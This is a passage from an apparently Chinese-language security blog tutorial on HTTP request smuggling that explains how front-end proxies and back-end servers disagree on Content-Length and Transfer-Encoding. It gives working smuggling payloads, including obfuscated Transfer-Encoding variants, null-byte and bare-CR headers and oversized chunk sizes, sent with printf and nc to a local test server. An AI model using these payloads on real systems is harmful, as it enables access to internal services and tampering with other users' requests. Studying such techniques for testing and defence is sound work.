aoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132258.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132605.png" alt=""></p><blockquote><p>​    当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p></blockquote><p>HTTP Smuggling 攻击正是基于反向代理与后端服务器对于 HTTP 请求解析处理不一致，利用这种差异性我们可以在一个 HTTP 请求中 “嵌入” 另一个 HTTP 请求，以达到我们“走私”请求的目的，直接表现为我们可以访问内网服务，或者造成一些其他的攻击。</p><h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><p>既然是基于解析差异，那我们会有什么解析差异呢？场景仍然是上述构架的场景，只不过我们简化一下，把后端服务器固定为一台，就不存在某些概率的情况了。也就是说，架构类似于如下示意图：</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">|<span class="hljs-string">------A-------&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">-------A------&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">               </span>|</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们知道 Content-Length 与 Transfer-Encoding 均可以作为 POST 数据传输时处理 body 的方式，为了方便阅读以及码字，我们对字段处理优先规则有以下简写规则：</p><ul><li>CL-TE 代表 Front 以 Content-Length 优先处理，Backend 以 Transfer-Encoding 优先处理</li><li>TE-CL 代表 Front 以 Transfer-Encoding 优先处理，Backend 以 Content-Length 优先处理</li></ul><p>并且 Front 代表的是反向代理等典型的前端服务器，Backend 代表的是处理请求的后端业务服务器，以下均由<code>\r\n</code>代替 CRLF，长度为两个字节。</p><h3 id="Chunks-Priority-On-Content-Length"><a href="#Chunks-Priority-On-Content-Length" class="headerlink" title="Chunks Priority On Content-Length"></a>Chunks Priority On Content-Length</h3><p>有些同学可能看到这跟我会有同样的疑惑，对于 CL &amp; TE 解析优先级顺序的问题难道 RFC 文档没有做出规范化嘛？有当然是有的，见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC 7230 Message Body Length</a></p><blockquote><p>​    If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length.  Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting  (Section 9.4) and ought to be handled as an error.  A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p></blockquote><p>虽然这里是指出了 TL 优先于 CL ，但是我们仍然可以通过一些方式绕过，又或者说，那个中间件的也没有依照这个 RFC 标准规范实现，这就导致了差异性的存在。</p><p>例如我们使用以下代码来发送 HTTP 请求：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET / HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-length:56\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tmp HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tests HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></tbody></table></figure><p></p><p>以上正确的解析应该是解析成三个请求：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Content-length:56</span></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tmp</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tests</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>而如果存在 TE &amp; CL 优先级问题的话，会被解析成两个请求：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1[CRLF]</span><br><span class="line"><span class="hljs-attribute">Host:localhost[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">Content-length:56[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked[CRLF] (ignored and removed, hopefully)</span><br><span class="line"><span class="hljs-attribute">Dummy:Header[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">[CRLF]</span></span><br><span class="line">0[CRLF]  (start of 56 bytes of body)</span><br><span class="line">[CRLF]</span><br><span class="line">GET /tmp HTTP/1.1[CRLF]</span><br><span class="line"><span class="hljs-attribute">Host:localhost[CRLF]</span></span><br><span class="line">Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tests</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Bad-Chunked-Transmission"><a href="#Bad-Chunked-Transmission" class="headerlink" title="Bad Chunked Transmission"></a>Bad Chunked Transmission</h3><p>根据 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC7230 section 3.3.3</a> ：</p><blockquote><p>If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.</p></blockquote><p>也就是说当接受到<code>Transfer-Encoding: chunked, zorg</code>的时候，应该返回 400 错误。</p><p>这类可以有很多绕过，比如：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: x</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding:[tab]chunked</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"> Transfer-Encoding: chunked</span><br><span class="line"><span class="hljs-attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span></span><br><span class="line"> : chunked</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Null-In-Headers"><a href="#Null-In-Headers" class="headerlink" title="Null In Headers"></a>Null In Headers</h3><p>在一些用 C 写的中间件服务器当中比较容易产生这个问题，因为<code>\0</code>代表字符串结束标志，当用在 header 里面，如果我们用<code>\0</code>就可能让中间件出现一些不正常的解析。</p><p>比如说：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span></span><br><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET / HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-\0dummy: foo\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'length: 56\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tmp HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tests HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></tbody></table></figure><p></p><p>有些中间件处理以上的请求时，当遇到<code>\0</code>的时候会继续换行读取，这样也会导致产生解析差异。</p><h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p>根据 <a href="https://tools.ietf.org/html/rfc7230#section-3.5" target="_blank" rel="noopener">RFC7320 section-3.5</a>:</p><blockquote><p>Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR.</p></blockquote><p>也就是说除了 CRLF 我们还可以用 LF 作为 EOL，但是在 Node.js &lt; 5.6.0 的版本，对于 CRLF 的处理也是比较有趣的：</p><p></p><figure class="highlight markdown hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">CR</span>] + ? == [<span class="hljs-string">CR</span>][<span class="hljs-symbol">LF</span>]//true</span><br></pre></td></tr></tbody></table></figure><p></p><p>假设我们有一个正常解析 CRLF 的 Front 服务器，后端是有该漏洞的 Node.js 服务，我们可以发送以下请求：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host:localhost\r\n</span></span><br><span class="line"><span class="hljs-attribute">Dummy</span>: Header\rZTransfer-Encoding: chunked\r\n</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 52\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br><span class="line">GET /tmp HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host:localhost\r\n</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header\r\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Front 服务器就会认为<code>Dummy: Header\rZTransfer-Encoding: chunked\r\n</code>是一个 header ，使用 CL 头解析，会认为这是一个完整的请求，而 Node.js 会认为<code>\rZ</code>是一个换行，按照 TE 优先于 CL 的解析规则，认为这是两个请求，就产生了解析差异。</p><h3 id="Size-Issue"><a href="#Size-Issue" class="headerlink" title="Size Issue"></a>Size Issue</h3><p>还可以利用一些编码块长度产生解析差异，例如：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET / HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Dummy:Header\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0000000000000000000000000000042\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET /tmp/ HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></tbody></table></figure><p></p><p>某些中间件在解析块大小的时候，会将长度块大小长度进行截断，比如这里表现为只取<code>'0000000000000000000000000000042</code>为<code>00000000000000000</code>，这样就会认为这是两个请求了，第一个请求的块大小为0，第二个就会请求<code>/tmp</code>，就导致了 HTTP Smuggling。</p><h3 id="HTTP-Version"><a href="#HTTP-Version" class="headerlink" title="HTTP Version"></a>HTTP Version</h3><p>这个主要是由于 HTTP/0.9 引起的问题，我们先来看看 HTTP 几个版本的 example ：</p><p>HTTP v1.1</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>HTTP v1.0</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>HTTP v0.9</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-builtin-name">GET</span> /foo\r\n</span><br></pre></td></tr></tbody></table></figure><p></p><p>并且 HTTP/0.9 请求包与响应包是都没有 headers 的概念的，也就是说如下：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130142331.png" alt=""></p><p>因为 HTTP/0.9 响应包没有 headers 的特性，在 HTTP Smuggling 中利用起来也就特别的有意思了。</p><p><img 